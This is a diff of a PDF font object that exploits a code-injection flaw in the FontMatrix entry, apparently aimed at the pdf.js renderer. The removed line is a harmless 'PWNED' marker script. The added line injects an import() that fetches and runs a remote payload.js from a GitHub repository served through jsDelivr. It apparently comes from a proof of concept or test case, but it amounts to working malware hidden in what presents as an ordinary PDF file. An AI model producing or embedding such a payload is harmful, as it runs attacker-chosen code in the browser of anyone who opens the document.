@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-window.__PWN=location.origin;document.title='PWNED-'+document.domain
+import\('https://cdn.jsdelivr.net/gh/davidxbors/pdfjs-render-testcase@3da47d002a34ef816f77170c4b728c57b4c2266c/payload.js'\)
 //)]
 /Subtype/Type1
 /FirstChar 65
